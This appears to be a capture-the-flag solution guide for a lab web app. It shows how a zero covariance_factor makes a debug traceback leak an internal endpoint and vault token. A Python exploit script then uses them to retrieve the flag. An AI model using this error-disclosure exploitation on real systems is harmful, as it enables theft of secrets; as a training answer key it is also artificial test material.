# A10 Easy: Solution Guide

### Vulnerability Analysis
1. Browse to `/portfolio`. The form requests asset weights and a `covariance_factor`.
2. Submitting `covariance_factor: 0` induces a `ZeroDivisionError`.
3. The server catches the unhandled condition and returns a detailed debug traceback disclosing:
   - `INTERNAL_ENDPOINT: "/api/v1/internal/confidential-vault"`
   - `INTERNAL_VAULT_TOKEN: "QE_TOKEN_..."`
4. Make a request to `/api/v1/internal/confidential-vault?token=<INTERNAL_VAULT_TOKEN>` to retrieve the dynamic flag.

### Exploit Script
```python
import re
import requests

BASE_URL = "http://127.0.0.1:6028"

# 1. Trigger exception
resp = requests.post(f"{BASE_URL}/portfolio", data={
    "assets": "NVDA, AAPL",
    "weights": "0.5, 0.5",
    "covariance_factor": "0"
})

# 2. Extract token and endpoint from error traceback
token = re.search(r'INTERNAL_VAULT_TOKEN:\s*"([^"]+)"', resp.text).group(1)
endpoint = re.search(r'INTERNAL_ENDPOINT:\s*"([^"]+)"', resp.text).group(1)
print(f"[+] Leaked Internal Endpoint: {endpoint}")
print(f"[+] Leaked Vault Token: {token}")

# 3. Retrieve flag from internal endpoint
vault_resp = requests.get(f"{BASE_URL}{endpoint}?token={token}")
flag = re.search(r"RTSA\{[^}]+\}", vault_resp.text).group(0)
print(f"[+] Dynamic Flag: {flag}")
```
